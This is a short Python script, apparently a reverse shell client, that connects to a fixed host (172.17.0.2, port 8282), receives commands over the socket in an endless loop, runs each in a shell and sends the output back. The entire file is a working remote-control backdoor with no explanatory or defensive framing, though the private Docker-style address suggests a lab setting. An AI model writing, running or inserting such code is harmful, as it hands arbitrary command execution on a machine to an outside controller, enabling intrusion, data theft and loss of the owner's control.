import socket
import subprocess

host = "172.17.0.2"
port = 8282

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, port))

while True:
    command = s.recv(1024).decode()
    output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, text=True)
    result = output.stdout
    if(result==''):
        s.send("success".encode())
    else:
        s.send(result.encode())
